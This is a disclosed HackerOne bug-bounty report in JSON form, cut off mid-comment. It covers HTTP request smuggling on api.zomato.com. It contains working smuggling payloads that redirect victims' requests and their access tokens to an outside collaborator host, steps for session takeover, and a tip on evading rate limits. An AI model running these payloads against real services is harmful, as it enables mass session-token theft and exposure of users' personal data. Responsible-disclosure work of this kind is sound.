{"id":771666,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzE2NjY=","url":"https://hackerone.com/reports/771666","title":"Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-10T14:24:17.581Z","submitted_at":"2020-01-10T14:24:17.581Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"defparam","url":"/defparam","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-07-09T05:56:04.312Z","bug_reporter_agreed_on_going_public_at":"2020-07-09T05:56:04.231Z","team_member_agreed_on_going_public_at":"2020-07-09T05:33:21.855Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Intro\nHi Zomato Security Team!\nMy name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I've taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads. When evaluating your platform I've found one asset that falls victim to HTTP Smuggling Attacks that result in: PII/Information Leakage, Session Takeover, Victim Request Hijacking/Forging and Forced Victim Redirection to Attacker Endpoint. this is a serious bug that should be dealt with immediately as any bad Actor could use these issues to stage attacks that could cause severe damage to Zomato and Zomato's Customers.\n\n# api.zomato.com\n## The Request Smuggling Bug\nThis asset is vulnerable several CL.TE-based HTTP Request Smuggling issues. This issue can cause data to poison the backend server socket and interfere with customer requests. One specific payload that cause issues are named in my tool as: \"**tabprefix1**\". This payload is a mutation of the \"**Transfer-Encoding: chunked**\" header that is placed in an HTTP request with \"**Content-Length: (length)**\" header. In the HTTP spec it is stated that when both Transfer-Encoding: chunked and Content-Length headers are specified then the server should always prioritize chunked encoding over Content-Length sizing. However, in cases when multiple reverse proxies are inline to an HTTP connection and a corner case TE and CL header are both specified, there are times when the frontend server may not recognize the TE header and fallback to CL processing while the backend server recognizes the TE header and prioritizes it over CL. When this happens it is considered HTTP De-synchronization which can lead to Request Smuggling (attacker data poisoning the backend socket into the victim connection).\n\nDefinition of **tabprefix1**:\n- An HTTP request where both CL and TE headers are specified and where the TE header is formatted like so:\n\t- ``Transfer-Encoding:\\tchunked`` (note that there is a tab after the colon and before the 'chunked', this disrupts the parsing)\n\nThis asset specifically shows issues with the **tabprefix1** test (see glimpse below)\n\n{F680682}\n\nIf we focus on this specific attack payload,  here is what a typical hijack would look like:\n```\nDELETE / HTTP/1.1\nTransfer-Encoding:\tchunked\nHost: api.zomato.com\nContent-Length: 51\nUser-Agent: Treasure/6.7\n\n0\n\nGET /some/other/endpoint HTTP/1.1\nX-Ignore: X[STOP]\n```\nIf you look closely at the headers both Transfer-Encoding and Content-Length headers are specified in this payload. This hits a natural corner case in which Transfer-Encoding takes priority over the Content-Length, however if you look closely this payload places a tab character after the colon on the Transfer-Encoding line. By doing this the frontend server rejects that line and processes the whole request using the length of 51 found in the Content-Length header and forwards all 51 bytes of data to the backend server. The backend server sees the same HTTP request and processes the `Transfer-Encoding : chunked` as a normal chunked request. The issue is that the chucked request specifies 0 bytes of data and the remaining data of the 51 bytes is left on socket to poison the next customer request that comes into the backend server. Since this payload has no return characters after the \"X-Ignore: X\" then the poison data essentially pre-pends onto the customer request, their HTTP request line is deleted and the customer is redirected to `/some/other/endpoint`\n\n\n# Bug #1 - Chain with an Open Redirect to Steal Session Tokens at Bulk\nThis bug is the big one that I believe is critical. As an attacker with Burp, one can craft a single Request Smuggling payload to steal a customer session token on Zomato. The following payload can be pasted into the repeater to illustrate this:\n```\nDELETE / HTTP/1.1\nTransfer-Encoding:\tchunked\nHost: api.zomato.com\nContent-Length: 91\nUser-Agent: Treasure/6.7\n\n0\n\nGET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1\nX: X\n```\nIt appears when you smuggle and hijack an HTTP request and you change the request endpoint to be: `https://some.host.name/desync/` on the request line the backend server should never see a request like this because the frontend server immediately returns `404 Not Found`. However, if you smuggle it past the frontend server to the backend then the request is never filtered and it is responded to with a `301 Moved Permanently` to the location `http://some.host.name/desync`. When we do that to a victim connection the victim's HTTP client automatically redirects to the new location with the same exact headers (including and most importantly the `X-Access-Token:` header). In my test I set up a Burp Collaborator client with an address to force redirection to. The collaborator sees the DNS lookup and the HTTP Request with the  `X-Access-Token:` token. Futhermore I also receive the IP address of the victim.\n\nHere is an example of me sending 1 smuggle/hijack to a victim in Burp Repeater:\n█████\n\nHere is the victim request showing up in my collaborator:\n█████████\n\nTo illustrate impact, an attacker could write a script to scrape Access-Tokens this way, then with the access token grab the UserID via `GET /v2/tabbed/home HTTP/1.1`. Then with the Access-Token/UserID pair the attacker can access: `GET /v2/userdetails.json/\u003cUSERID\u003e HTTP/1.1` to get the victim's First/Last Name, Phone Number, Email address, etc..\n\nAlso the attacker can perform full session takeover/impersonation by performing a normal login into zomato, intercept the response to his own `POST /v2/auth` request and swap his Access-Token/USERID with the victim's Access-Token/USERID. By doing this the mobile app will log onto zomato as if the attacker were the victim.\n\n# Bug #1 - Triage\n1) Open Burp and go into the Repeater tab\n2) Click send and enter in the hostname/port/SSL (api.zomato.com 443 checked)\n3) Click on menu Burp-\u003eBurp Collaborator client\n4) In the Collaborator window set to Poll every 1 second and click on \"Copy to clipboard\", your collaborator URL should be in the clipboard, keep it saved\n5) Back in the repeater paste the following as your request body:\n```\nDELETE / HTTP/1.1\nTransfer-Encoding:\tchunked\nHost: api.zomato.com\nContent-Length: 91\nUser-Agent: Treasure/6.7\n\n0\n\nGET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1\nX: X\n```\nand replace YOUR_COLLAB_URL with the one copied from your collab client\n\n6) Click send as many times required to see HTTP requests in your collab window.\n**NOTE**: Sometimes you may just see DNS requests to your collaborator. Send the payload out as many times required to see an HTTP request.\n\n# Conclusion\nThanks for your time reading my report and performing triage. I hope this writeup proves helpful! I have ceased my testing on `api.zomato.com` until remedy is in place. Once your team had remedy in place I will be happy to run my array of desync tests on the asset.\n\nThanks,\n@defparam\n\n## Impact\n\nAttacker can achieve victim session takeover in bulk and steal all information from the victim. This attack can be automated to perform this process in bulk. Since this is the case I have filed this report as **Critical** because I believe it meets the criteria of:\n\n`Information Disclosure - mass PII leaks including data such as names, phone numbers and addresses`","vulnerability_information_html":"\u003ch1 id=\"intro\"\u003eIntro\u003c/h1\u003e\n\n\u003cp\u003eHi Zomato Security Team!\u003cbr\u003e\nMy name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I\u0026#39;ve taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads. When evaluating your platform I\u0026#39;ve found one asset that falls victim to HTTP Smuggling Attacks that result in: PII/Information Leakage, Session Takeover, Victim Request Hijacking/Forging and Forced Victim Redirection to Attacker Endpoint. this is a serious bug that should be dealt with immediately as any bad Actor could use these issues to stage attacks that could cause severe damage to Zomato and Zomato\u0026#39;s Customers.\u003c/p\u003e\n\n\u003ch1 id=\"api-zomato-com\"\u003eapi.zomato.com\u003c/h1\u003e\n\n\u003ch2 id=\"the-request-smuggling-bug\"\u003eThe Request Smuggling Bug\u003c/h2\u003e\n\n\u003cp\u003eThis asset is vulnerable several CL.TE-based HTTP Request Smuggling issues. This issue can cause data to poison the backend server socket and interfere with customer requests. One specific payload that cause issues are named in my tool as: \u0026quot;\u003cstrong\u003etabprefix1\u003c/strong\u003e\u0026quot;. This payload is a mutation of the \u0026quot;\u003cstrong\u003eTransfer-Encoding: chunked\u003c/strong\u003e\u0026quot; header that is placed in an HTTP request with \u0026quot;\u003cstrong\u003eContent-Length: (length)\u003c/strong\u003e\u0026quot; header. In the HTTP spec it is stated that when both Transfer-Encoding: chunked and Content-Length headers are specified then the server should always prioritize chunked encoding over Content-Length sizing. However, in cases when multiple reverse proxies are inline to an HTTP connection and a corner case TE and CL header are both specified, there are times when the frontend server may not recognize the TE header and fallback to CL processing while the backend server recognizes the TE header and prioritizes it over CL. When this happens it is considered HTTP De-synchronization which can lead to Request Smuggling (attacker data poisoning the backend socket into the victim connection).\u003c/p\u003e\n\n\u003cp\u003eDefinition of \u003cstrong\u003etabprefix1\u003c/strong\u003e:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eAn HTTP request where both CL and TE headers are specified and where the TE header is formatted like so:\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003eTransfer-Encoding:\\tchunked\u003c/code\u003e (note that there is a tab after the colon and before the \u0026#39;chunked\u0026#39;, this disrupts the parsing)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis asset specifically shows issues with the \u003cstrong\u003etabprefix1\u003c/strong\u003e test (see glimpse below)\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"initial_test.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ae4Acyh4BnSLioeJc2Lfjrkh?response-content-disposition=attachment%3B%20filename%3D%22initial_test.png%22%3B%20filename%2A%3DUTF-8%27%27initial_test.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064936Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026amp;X-Amz-Signature=4be6af3553b4425f3db0080e09cecdc28f18acc629c0aee54d445ec3c4cd9ab7\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ae4Acyh4BnSLioeJc2Lfjrkh?response-content-disposition=attachment%3B%20filename%3D%22initial_test.png%22%3B%20filename%2A%3DUTF-8%27%27initial_test.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064936Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026amp;X-Amz-Signature=4be6af3553b4425f3db0080e09cecdc28f18acc629c0aee54d445ec3c4cd9ab7\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf we focus on this specific attack payload,  here is what a typical hijack would look like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDELETE / HTTP/1.1\nTransfer-Encoding:  chunked\nHost: api.zomato.com\nContent-Length: 51\nUser-Agent: Treasure/6.7\n\n0\n\nGET /some/other/endpoint HTTP/1.1\nX-Ignore: X[STOP]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you look closely at the headers both Transfer-Encoding and Content-Length headers are specified in this payload. This hits a natural corner case in which Transfer-Encoding takes priority over the Content-Length, however if you look closely this payload places a tab character after the colon on the Transfer-Encoding line. By doing this the frontend server rejects that line and processes the whole request using the length of 51 found in the Content-Length header and forwards all 51 bytes of data to the backend server. The backend server sees the same HTTP request and processes the \u003ccode\u003eTransfer-Encoding : chunked\u003c/code\u003e as a normal chunked request. The issue is that the chucked request specifies 0 bytes of data and the remaining data of the 51 bytes is left on socket to poison the next customer request that comes into the backend server. Since this payload has no return characters after the \u0026quot;X-Ignore: X\u0026quot; then the poison data essentially pre-pends onto the customer request, their HTTP request line is deleted and the customer is redirected to \u003ccode\u003e/some/other/endpoint\u003c/code\u003e\u003c/p\u003e\n\n\u003ch1 id=\"bug-1-chain-with-an-open-redirect-to-steal-session-tokens-at-bulk\"\u003eBug #1 - Chain with an Open Redirect to Steal Session Tokens at Bulk\u003c/h1\u003e\n\n\u003cp\u003eThis bug is the big one that I believe is critical. As an attacker with Burp, one can craft a single Request Smuggling payload to steal a customer session token on Zomato. The following payload can be pasted into the repeater to illustrate this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDELETE / HTTP/1.1\nTransfer-Encoding:  chunked\nHost: api.zomato.com\nContent-Length: 91\nUser-Agent: Treasure/6.7\n\n0\n\nGET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1\nX: X\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt appears when you smuggle and hijack an HTTP request and you change the request endpoint to be: \u003ccode\u003ehttps://some.host.name/desync/\u003c/code\u003e on the request line the backend server should never see a request like this because the frontend server immediately returns \u003ccode\u003e404 Not Found\u003c/code\u003e. However, if you smuggle it past the frontend server to the backend then the request is never filtered and it is responded to with a \u003ccode\u003e301 Moved Permanently\u003c/code\u003e to the location \u003ccode\u003ehttp://some.host.name/desync\u003c/code\u003e. When we do that to a victim connection the victim\u0026#39;s HTTP client automatically redirects to the new location with the same exact headers (including and most importantly the \u003ccode\u003eX-Access-Token:\u003c/code\u003e header). In my test I set up a Burp Collaborator client with an address to force redirection to. The collaborator sees the DNS lookup and the HTTP Request with the  \u003ccode\u003eX-Access-Token:\u003c/code\u003e token. Futhermore I also receive the IP address of the victim.\u003c/p\u003e\n\n\u003cp\u003eHere is an example of me sending 1 smuggle/hijack to a victim in Burp Repeater:\u003cbr\u003e\n█████\u003c/p\u003e\n\n\u003cp\u003eHere is the victim request showing up in my collaborator:\u003cbr\u003e\n█████████\u003c/p\u003e\n\n\u003cp\u003eTo illustrate impact, an attacker could write a script to scrape Access-Tokens this way, then with the access token grab the UserID via \u003ccode\u003eGET /v2/tabbed/home HTTP/1.1\u003c/code\u003e. Then with the Access-Token/UserID pair the attacker can access: \u003ccode\u003eGET /v2/userdetails.json/\u0026lt;USERID\u0026gt; HTTP/1.1\u003c/code\u003e to get the victim\u0026#39;s First/Last Name, Phone Number, Email address, etc..\u003c/p\u003e\n\n\u003cp\u003eAlso the attacker can perform full session takeover/impersonation by performing a normal login into zomato, intercept the response to his own \u003ccode\u003ePOST /v2/auth\u003c/code\u003e request and swap his Access-Token/USERID with the victim\u0026#39;s Access-Token/USERID. By doing this the mobile app will log onto zomato as if the attacker were the victim.\u003c/p\u003e\n\n\u003ch1 id=\"bug-1-triage\"\u003eBug #1 - Triage\u003c/h1\u003e\n\n\u003cp\u003e1) Open Burp and go into the Repeater tab\u003cbr\u003e\n2) Click send and enter in the hostname/port/SSL (api.zomato.com 443 checked)\u003cbr\u003e\n3) Click on menu Burp-\u0026gt;Burp Collaborator client\u003cbr\u003e\n4) In the Collaborator window set to Poll every 1 second and click on \u0026quot;Copy to clipboard\u0026quot;, your collaborator URL should be in the clipboard, keep it saved\u003cbr\u003e\n5) Back in the repeater paste the following as your request body:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDELETE / HTTP/1.1\nTransfer-Encoding:  chunked\nHost: api.zomato.com\nContent-Length: 91\nUser-Agent: Treasure/6.7\n\n0\n\nGET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1\nX: X\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand replace YOUR_COLLAB_URL with the one copied from your collab client\u003c/p\u003e\n\n\u003cp\u003e6) Click send as many times required to see HTTP requests in your collab window.\u003cbr\u003e\n\u003cstrong\u003eNOTE\u003c/strong\u003e: Sometimes you may just see DNS requests to your collaborator. Send the payload out as many times required to see an HTTP request.\u003c/p\u003e\n\n\u003ch1 id=\"conclusion\"\u003eConclusion\u003c/h1\u003e\n\n\u003cp\u003eThanks for your time reading my report and performing triage. I hope this writeup proves helpful! I have ceased my testing on \u003ccode\u003eapi.zomato.com\u003c/code\u003e until remedy is in place. Once your team had remedy in place I will be happy to run my array of desync tests on the asset.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttacker can achieve victim session takeover in bulk and steal all information from the victim. This attack can be automated to perform this process in bulk. Since this is the case I have filed this report as \u003cstrong\u003eCritical\u003c/strong\u003e because I believe it meets the criteria of:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eInformation Disclosure - mass PII leaks including data such as names, phone numbers and addresses\u003c/code\u003e\u003c/p\u003e\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":86,"name":"HTTP Request Smuggling"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":680682,"file_name":"initial_test.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ae4Acyh4BnSLioeJc2Lfjrkh?response-content-disposition=attachment%3B%20filename%3D%22initial_test.png%22%3B%20filename%2A%3DUTF-8%27%27initial_test.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064936Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026X-Amz-Signature=4be6af3553b4425f3db0080e09cecdc28f18acc629c0aee54d445ec3c4cd9ab7","file_size":73909,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":514,"voters":["al-madjus","madmpj","arif_y","wi11","sat0shi","keshavkejriwal","sturedman","n0nce","totz_sec","r3b00t_","and 504 more..."],"severity":{"rating":"critical","score":9.8,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6736565,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"When assessing if this is a `Mass PII leak`, Using TurboIntruder in a small sample test I was able to steal an account per every 2 or 3 requests before getting rate limited. An attacker could set up several attacker processes across IP addresses/geos to bypass rate limiting and increase the throughput of account takeovers. A successful attack like this could compromise most of the userbase","markdown_message":"\u003cp\u003eWhen assessing if this is a \u003ccode\u003eMass PII leak\u003c/code\u003e, Using TurboIntruder in a small sample test I was able to steal an account per every 2 or 3 requests before getting rate limited. An attacker could set up several attacker processes across IP addresses/geos to bypass rate limiting and increase the throughput of account takeovers. A successful attack like this could compromise most of the userbase\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T14:38:47.166Z","updated_at":"2020-01-10T14:38:47.166Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6736585,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @defparam, \n\nThanks for the submission, looking into this. \n @ehsahil-zomato ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThanks for the submission, looking into this. \u003cbr\u003e\n \u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T14:41:22.435Z","updated_at":"2020-01-10T14:41:22.435Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6736764,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @defparam, \n\nCan you please us video proof of concept showing the exploitation of this issue? \n\nThanks\n@ehsahil-zomato ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eCan you please us video proof of concept showing the exploitation of this issue? \u003c/p\u003e\n\n\u003cp\u003eThanks\u003cbr\u003e\n\u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T15:04:39.612Z","updated_at":"2020-01-10T15:04:39.612Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6736813,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@ehsahil-zomato,\n\nHere ya go:\n████\nBest,\n@defparam","markdown_message":"\u003cp\u003e\u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eHere ya 